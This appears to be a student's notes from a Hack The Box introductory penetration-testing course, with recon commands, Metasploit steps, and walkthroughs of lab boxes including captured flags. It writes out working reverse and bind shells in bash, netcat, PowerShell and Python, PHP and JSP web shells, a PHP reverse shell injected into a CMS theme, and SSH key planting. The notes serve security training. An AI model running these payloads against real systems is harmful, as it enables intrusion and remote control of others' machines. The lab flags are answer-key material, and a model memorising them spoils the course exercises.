---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Getting started

## Infosec Overview

The Information Security (infosec) has different domains :

* Network and infrastructure security
* Application security
* Systems auditing
* Business continuity planning
* Digital forensics
* Incident detection and response

The Risk Management Process :

| Step                 | Explanation                                                                                                                                                                             |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Identifying the Risk | Identifying risks the business is exposed to, such as legal, environmental, market, regulatory, and other types of risks.                                                               |
| Analyze the Risk     | Analyzing the risks to determine their impact and probability. The risks should be mapped to the organization's various policies, procedures, and business processes.                   |
| Evaluate the Risk    | Evaluating, ranking, and prioritizing risks. Then, the organization must decide to accept (unavoidable), avoid (change plans), control (mitigate), or transfer risk (insure).           |
| Dealing with Risk    | Eliminating or containing the risks as best as possible. This is handled by interfacing directly with the stakeholders for the system or process that the risk is associated with.      |
| Monitoring Risk      | All risks must be constantly monitored. Risks should be constantly monitored for any situational changes that could change their impact score, i.e., from low to medium or high impact. |

Different tools :

* `openvpn`
* `ifconfig`
* `netstat`
* `ssh`
* `netcat` or `socat`
* `tmux` or `screen`
* `vim`
*

```
sudo openvpn user.ovpn
ifconfig
netstat -rn
ssh bob@10.10.10.10
netcat 10.10.10.10 22
vim /etc/hosts
```

## Nmap

```
nmap 10.129.42.253
nmap -sV 10.129.42.253      # version scan
nmap -sC 10.129.42.253      # script tries to gain more information
nmap -p- 10.129.42.253      # scan all TCP ports 0-65,535
​
​
locate script/citrix
nmap --script /usr/share/nmap/scripts/citrix-brute-xml.nse -p 80 10.10.14.2
nmap -sV --script=banner 10.10.14.2
​
nc -nv 10.10.14.2 21
nmap -sV --script=banner -p 21 10.10.14.4/24
nmap -sC -sV -p 21 10.129.42.253
​
ftp -p 10.129.42.253
​
ftp (user)> anonymous
ftp> cd pub
ftp> get login.txt
ftp> exit
​
cat login.txt
```

## SMB

```
nmap --script smb-os-discovery.nse -p 445 10.10.10.40
nmap -A -p 445 10.129.42.253
​
smbclient -N -L \\\\10.129.42.253           # -N (no password) -L (share list)
smbclient -N \\\\10.129.42.253\\users       # anonymous connection
smbclient -U bob \\\\10.129.42.253\\users   # authentified connection
​
smb:\> Welcome1
smb:\> ls
smb:\> cd bob
smb:\> get passwords.txt
sbm:\> exit
​
cat passwords.txt
```

## SNMP

```
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
snmpwalk -v 2c -c private  10.129.42.253
​
onesixtyone -c dict.txt 10.129.42.254
```

## Questions

```
nmap -sV -p 8080 10.129.42.254
nmap 10.129.42.254
smbclient -N -L \\\\10.129.42.254
smbclient -U bob \\\\10.129.42.254\\users
​
smb:\> Welcome1
smb:\> cd flag
smb:\> get flag.txt
smb:\> exit
​
cat flag.txt
```

## Gobuster

File oand folder discovery tools :

* `fuff`
* `gobuster`

```
gobuster dir -u http://10.10.10.121:32505 -w /usr/share/dirb/wordlists/common.txt
​
git clone https://github.com/danielmiessler/SecLists
gobuster dns -d inlanefreight.com -w SecLists/Discovery/DNS/namelist.txt
```

## cURL

```
curl -IL https://www.inlanefreight.com
```

## Whatweb

```
whatweb 142.93.33.226:31452
whatweb --no-errors 142.93.33.0/24
```

## Challenge

```
142.93.33.226:31452

/.hta                 (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 281]
/index.php            (Status: 200) [Size: 990]
/robots.txt           (Status: 200) [Size: 45] 
/server-status        (Status: 403) [Size: 281]
/wordpress            (Status: 301) [Size: 327] [--> http://142.93.33.226:31452/wordpress/]

http://142.93.33.226:31452/admin-login-page.php

inspect source code -> admin:password123

HTB{w3b_3num3r4710n_r3v34l5_53cr375}
```

## Public exploits

Search on the web browser with keyword "exploit". Exploit tool :

```
sudo apt install exploitdb -y
searchsploit openssh 7.2
```

Other tools :

* Exploit DB
* Rapid7 DB
* Vulnerability Lab
* Metasploit Framework (MSF)

```
msfconsole

msf6> search exploit eternalblue
msf6> use exploit/windows/smb/ms17_010_psexec
msf6> show options
msf6> SET RHOST 165.232.102.34
msf6> SET RPORT 32278
msf6> SET LHOST tun0
msf6> check
msf6> exploit

meterpreter> getuid
meterpreter> shell

C:\WINDOWS\system32> whoami
```

Practise Metasploit on boxes :

* Granny/Grandpa
* Jerry
* Blue
* Lame
* Optimum
* Legacy
* Devel

## Challenge

```
msfconsole

[msf]>> search wordpress 2.7.10
[msf]>> use auxiliary/scanner/http/wp_simple_backup_file_read
[msf]>> show options
[msf]>> set RHOSTS 165.232.102.34
[msf]>> set RPORT 322278
[msf]>> set FILEPATH /flag.txt
[msf]>> exploit
[msf]>> exit

cat /home/htb-ac498562/.msf4/loot/202...tra_370627.txt
# HTB{my_f1r57_h4ck}
```

## Types of shells

### Reverse Shell

Get a quick reliable connection to the compromised host, but fragile.

* start a netcat listener on our machine
* execute on remote system a reverse shell command

```
nc -lnvp 1234		# -l : listen mode
					# -v : verbose mode
					# -n : disable DNS resolution
					# -p : specify port
ip a
```

Bash scripts :

```
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

Powershell script :

```
powershell -NoP -NonI -W Hidden -Exec Bypass 
		   -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};

while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {;
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2  = $sendback + "PS " + (pwd).Path + "> ";
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush()
};

$client.Close()
```

Or inline : `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`

### Bind Shell

Bash script :

```
rm /tmp/f;
mkfifo /tmp/f;
cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Python script :

```
python -c 'exec("""\
  import socket as s,subprocess as sp;\
  s1=s.socket(s.AF_INET,s.SOCK_STREAM);\
  s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);\
  s1.bind(("0.0.0.0",1234));\
  s1.listen(1);\
  c,a=s1.accept();\n\
  while True: \
  	d=c.recv(1024).decode();\
	p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);\
	c.sendall(p.stdout.read()+p.stderr.read())\
""")'
```

Powershell script :

```
powershell -NoP -NonI -W Hidden -Exec Bypass
		   -Command $listener = [System.Net.Sockets.TcpListener]1234;

$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {;
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2 = $sendback + "PS " + (pwd).Path + " ";
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush()
};

$client.Close();
```

Once it is listening, just connect to remote with netcat :

```
nc 10.10.10.1 1234
```

### Upgrade TTY

```
python -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo
fg

echo $TERM
stty size						# rows and columns of terminal
export $TERM=xterm-256color
stty rows 67 columns 318
```

### Web Shell

PHP script :

```
<?php system($_REQUEST["cmd"]); ?>
```

JSP script :

```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

ASP script :

```
...
```

## Privilege Escalation

PrivEsc checklist :

* [HackTricks](https://book.hacktricks.xyz/)
* [PayloadsAllTheThing](https://github.com/swisskyrepo/PayloadsAllTheThings)

Enum scripts :

* [LinEnum](https://github.com/rebootuser/LinEnum.git)
* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
* [Seatblet](https://github.com/GhostPack/Seatbelt)
* [JAWS](https://github.com/411Hall/JAWS)
* [PEASS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

```
sudo su -						# switch current user to root user
sudo -l							# list sudo privileges
sudo -u user /bin/echo hello	# run command as "user"
```

Exploit command with sudo :

* [GTFOBins](https://gtfobins.github.io/)
* [LOLBAS](https://lolbas-project.github.io)

## Scheduled Tasks

List of files to inject script :

* /etc/crontab
* /etc/cron.d
* /var/spool/cron/crontab/root

## SSH Keys

Ssh key location :

* `/home/user/.ssh/id_rsa`
* `/root/.ssh/id_rsa`

If you get the remote public key :

```
vim id_rsa
chmod 600 id_rsa
ssh user@10.10.10.10 -i id_rsa		# use rsa key
```

If you can insert your public key into remote :

```
ssh-keygen -f key
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
ssh root@10.10.10.10 -i key
```

## Challenge (privilege escalation)

```
ssh user1@138.68.164.196 -p 30950

user1@remote> sudo -l
user1@remote> sudo -u user2 /bin/bash
(password1)

user2@remote> cd /home/user2
user2@remote> cat flag.txt					# HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
user2@remote> cat /root/.ssh/id_rsa			# copy private key

me@local> vim ~/.ssh/id_rsa					# paste into this file
me@local> ssh root@138.68.164.196 -p 30950

root@remote> cat flag.txt					# HTB{pr1v1l363_35c4l4710n_2_r007} 
```

## Transferring files

Source : [PythonHttpServer](https://developer.mozilla.org/en-US/docs/Learn/Common\_questions/set\_up\_a\_local\_testing\_server)

```
user@local> cd /tmp
user@local> python3 -m http.server 8000							# create a web server listening on port 8000

user@remote> wget http://10.10.14.1:8000/linesum.sh				# if remote has "wget"
user@remote> curl http://10.10.14.1:8000/linesum.sh				# if remote has "curl"

user@local> scp linenum.sh user@remotehost:/tmp/linenum.sh		# if you get ssh credentials
```

To bypass firewall protection, encode the file into base64 and upload to remote, then decode :

```
user@local> base64 shell -w 0			# generate base64 string

user@remote> echo f0VMRgIBAQAAAAAAA...gAU0iJ51JXSInmDwU | base64 -d > shell		# paste and decode
```

### Validating File Transfers

```
user@remote> file shell			# check file type

user@remote> md5sum shell		# compare local and remote md5 hash files
user@local> md5sum shell		# if it matches, transfer is successful
```

## Starting Out

Exercises environment outside of HTB :

* [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
* [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/)
* [Metasploitable 3](https://github.com/rapid7/metasploitable3)
* [DVWA](https://github.com/digininja/DVWA)

Youtube channels :

* [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)
* [VbScrub](https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ)
* [STÖK](https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg)
* [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)

Blogs :

* [0xdf](https://0xdf.gitlab.io/) (for retired boxes)

Tuto websites :

* [UnderTheWire](https://www.underthewire.tech/index.htm) (powershell and linux commands training)
* [OverTheWire](https://overthewire.org/wargames/)

## Attacking your first box : Nibbles

10.129.200.170

Box types :

* Black-Box : low level to no knowledge of a target.
* Grey-Box : the tester is given a certain mount of information in advance.
* White-Box : the tester is given complete access.

```
ping 10.129.200.170
nmap -sV --open -oA nibbles_initial_scan 10.129.200.170
nmap -p- --open -oA nibbles_full_tcp_scan 10.129.200.170

nc -nv 10.129.200.170 22									# get the OS and the service versions
nc -nv 10.129.200.170 80

nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.200.170
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.200.170

whatweb 10.129.200.170						# check if we can see the service
curl http://10.129.200.170					# get the web page content (result found in comments)
whatweb http://10.129.200.170/nibbleblog	# check services

gobuster dir -u http://10.129.200.170/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt 
													# README, index.php and admin.php are availables
curl http://10.129.200.170/nibbleblog/README		# it's Nibble 4.0.3
```

We can see an exploit [here](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog\_file\_upload/).

```
curl -s http://10.129.200.170/nibbleblog/content/private/users.xml | xmllint --format -
```

* We started with a simple nmap scan showing two open ports
* Discovered an instance of Nibbleblog
* Analyzed the technologies in use using whatweb
* Found the admin login portal page at admin.php
* Discovered that directory listing is enabled and browsed several directories
* Confirmed that admin was the valid username
* Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts
* Uncovered clues that led us to a valid admin password of nibbles

## Sources

* web enumeration
  * [http\_status\_codes](https://en.wikipedia.org/wiki/List\_of\_HTTP\_status\_codes)
  * [fuff](https://github.com/ffuf/ffuf)
  * [gobuster](https://github.com/OJ/gobuster)

## Assesment

Scan all remote host ports :

```
nmap -p- 10.129.228.10

# output
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Enumerate with gobuster :

```
gobuster dir -u http://10.129.228.10 -w /usr/share/dirb/wordlists/common.txt

# output
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.129.228.10/admin/]
/backups              (Status: 301) [Size: 316] [--> http://10.129.228.10/backups/]
/.htaccess            (Status: 403) [Size: 278]                                    
/data                 (Status: 301) [Size: 313] [--> http://10.129.228.10/data/]   
/index.php            (Status: 200) [Size: 5485]                                   
/plugins              (Status: 301) [Size: 316] [--> http://10.129.228.10/plugins/]
/robots.txt           (Status: 200) [Size: 32]                                     
/server-status        (Status: 403) [Size: 278]                                    
/sitemap.xml          (Status: 200) [Size: 431]                                    
/theme                (Status: 301) [Size: 314] [--> http://10.129.228.10/theme/] 
```

Go to the Files Go to the Theme, you see there is an url thus add DNS to `/etc/hosts` :

* `/robots.txt` : reveals the admin subdirectory.
* `/admin` : try some credentials like `admin:admin`, it works !
* `/backups` : only two files in `other` folder
* `/index.php`
* `/data` : there is more information
* `/sitemap.xml`

In [http://10.129.228.10/data/users/admin.xml](http://10.129.228.10/data/users/admin.xml), there are some credentials :

* user : admin
* pwd : d033e22ae348aeb5660fc2140aec35850c4da997
* email : [admin@gettingstarted.com](mailto:admin@gettingstarted.com)

In [http://10.129.228.10/data/other/authorization.xml](http://10.129.228.10/data/other/authorization.xml), there is an API key :

* key : `4f399dc72ff8e619e327800f851e9986`

You can edit Components in Theme tab and you can add some php code in there. Create a listener on you attack machine :

```
nc -lnvp 1234
```

Add at the end of the component the following line to create a reverse shell :

```
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.174 1234 >/tmp/f'); ?>
```

Go to the home page [http://10.129.228.10](http://10.129.228.10/), the page should load forever and you see a new shell appears on you attack machine, you got the reverse shell.

Upgrade the shell with `python3 -c "import pty; pty.spawn('/bin/bash')"`.

```
cat /home/mrb3n/user.txt		# 7002d65b149b0a4d19132a66feed21d8
```

Then download LinEnum on your attack host and run web server with Python :

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
python -m http.server 8080
```

Download the file on the target host :

```
wget http://10.10.15.174:8080/LinEnum.sh		# didn't work for me
```

Thus I tried to find a misconfiguration manually :

```
sudo -l		# it says that I can run /usr/bin/php with sudo NOPASSWORD
```

Create a new listener on attack host :

```
nc -lnvp 1235
```

The command `php -r` execute php code inline. Run the following line on target host :

```
sudo /usr/bin/php -r "system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.174 1235 >/tmp/f');"
```

Got a reverse shell on attack host.

```
cat /root/root.txt		# f1fba6e9f71efb2630e6e34da6387842
```

## Basic Tools

| **Command**              | **Description**                      |
| ------------------------ | ------------------------------------ |
| **General**              |                                      |
| `sudo openvpn user.ovpn` | Connect to VPN                       |
| `ifconfig`/`ip a`        | Show our IP address                  |
| `netstat -rn`            | Show networks accessible via the VPN |
| `ssh user@10.10.10.10`   | SSH to a remote server               |
| `ftp 10.129.42.253`      | FTP to a remote server               |
| **tmux**                 |                                      |
| `tmux`                   | Start tmux                           |
| `ctrl+b`                 | tmux: default prefix                 |
| `prefix c`               | tmux: new window                     |
| `prefix 1`               | tmux: switch to window (`1`)         |
| `prefix shift+%`         | tmux: split pane vertically          |
| `prefix shift+"`         | tmux: split pane horizontally        |
| `prefix ->`              | tmux: switch to the right pane       |
| **Vim**                  |                                      |
| `vim file`               | vim: open `file` with vim            |
| `esc+i`                  | vim: enter `insert` mode             |
| `esc`                    | vim: back to `normal` mode           |
| `x`                      | vim: Cut character                   |
| `dw`                     | vim: Cut word                        |
| `dd`                     | vim: Cut full line                   |
| `yw`                     | vim: Copy word                       |
| `yy`                     | vim: Copy full line                  |
| `p`                      | vim: Paste                           |
| `:1`                     | vim: Go to line number 1.            |
| `:w`                     | vim: Write the file 'i.e. save'      |
| `:q`                     | vim: Quit                            |
| `:q!`                    | vim: Quit without saving             |
| `:wq`                    | vim: Write and quit                  |

## Pentesting

| **Command**                                                                           | **Description**                                                       |
| ------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| **Service Scanning**                                                                  |                                                                       |
| `nmap 10.129.42.253`                                                                  | Run nmap on an IP                                                     |
| `nmap -sV -sC -p- 10.129.42.253`                                                      | Run an nmap script scan on an IP                                      |
| `locate scripts/citrix`                                                               | List various available nmap scripts                                   |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40`                                | Run an nmap script on an IP                                           |
| `netcat 10.10.10.10 22`                                                               | Grab banner of an open port                                           |
| `smbclient -N -L \\\\10.129.42.253`                                                   | List SMB Shares                                                       |
| `smbclient \\\\10.129.42.253\\users`                                                  | Connect to an SMB share                                               |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`                            | Scan SNMP on an IP                                                    |
| `onesixtyone -c dict.txt 10.129.42.254`                                               | Brute force SNMP secret string                                        |
| **Web Enumeration**                                                                   |                                                                       |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`        | Run a directory scan on a website                                     |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website                                    |
| `curl -IL https://www.inlanefreight.com`                                              | Grab website banner                                                   |
| `whatweb 10.10.10.121`                                                                | List details about the webserver/certificates                         |
| `curl 10.10.10.121/robots.txt`                                                        | List potential directories in `robots.txt`                            |
| `ctrl+U`                                                                              | View page source (in Firefox)                                         |
| **Public Exploits**                                                                   |                                                                       |
| `searchsploit openssh 7.2`                                                            | Search for public exploits for a web application                      |
| `msfconsole`                                                                          | MSF: Start the Metasploit Framework                                   |
| `search exploit eternalblue`                                                          | MSF: Search for public exploits in MSF                                |
| `use exploit/windows/smb/ms17_010_psexec`                                             | MSF: Start using an MSF module                                        |
| `show options`                                                                        | MSF: Show required options for an MSF module                          |
| `set RHOSTS 10.10.10.40`                                                              | MSF: Set a value for an MSF module option                             |
| `check`                                                                               | MSF: Test if the target server is vulnerable                          |
| `exploit`                                                                             | MSF: Run the exploit on the target server is vulnerable               |
| **Using Shells**                                                                      |                                                                       |
| `nc -lvnp 1234`                                                                       | Start a `nc` listener on a local port                                 |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`                                 | Send a reverse shell from the remote server                           |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/sh -i 2>&1\\|nc 10.10.10.10 1234 >/tmp/f`  | Another command to send a reverse shell from the remote server        |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\\|/bin/bash -i 2>&1\\|nc -lvp 1234 >/tmp/f`       | Start a bind shell on the remote server                               |
| `nc 10.10.10.1 1234`                                                                  | Connect to a bind shell started on the remote server                  |
| `python -c 'import pty; pty.spawn("/bin/bash")'`                                      | Upgrade shell TTY (1)                                                 |
| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice                           | Upgrade shell TTY (2)                                                 |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`                     | Create a webshell php file                                            |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id`                                         | Execute a command on an uploaded webshell                             |
| **Privilege Escalation**                                                              |                                                                       |
| `./linpeas.sh`                                                                        | Run `linpeas` script to enumerate remote server                       |
| `sudo -l`                                                                             | List available `sudo` privileges                                      |
| `sudo -u user /bin/echo Hello World!`                                                 | Run a command with `sudo`                                             |
| `sudo su -`                                                                           | Switch to root user (if we have access to `sudo su`)                  |
| `sudo su user -`                                                                      | Switch to a user (if we have access to `sudo su`)                     |
| `ssh-keygen -f key`                                                                   | Create a new SSH key                                                  |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`          | Add the generated public key to the user                              |
| `ssh root@10.10.10.10 -i key`                                                         | SSH to the server with the generated private key                      |
| **Transferring Files**                                                                |                                                                       |
| `python3 -m http.server 8000`                                                         | Start a local webserver                                               |
| `wget http://10.10.14.1:8000/linpeas.sh`                                              | Download a file on the remote server from our local machine           |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`                                | Download a file on the remote server from our local machine           |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh`                                      | Transfer a file to the remote server with `scp` (requires SSH access) |
| `base64 shell -w 0`                                                                   | Convert a file to `base64`                                            |
| `echo f0VMR...SNIO...InmDwU \\| base64 -d > shell`                                    | Convert a file from `base64` back to its orig                         |
| `md5sum shell`                                                                        | Check the file's `md5sum` to ensure it converted correctly            |
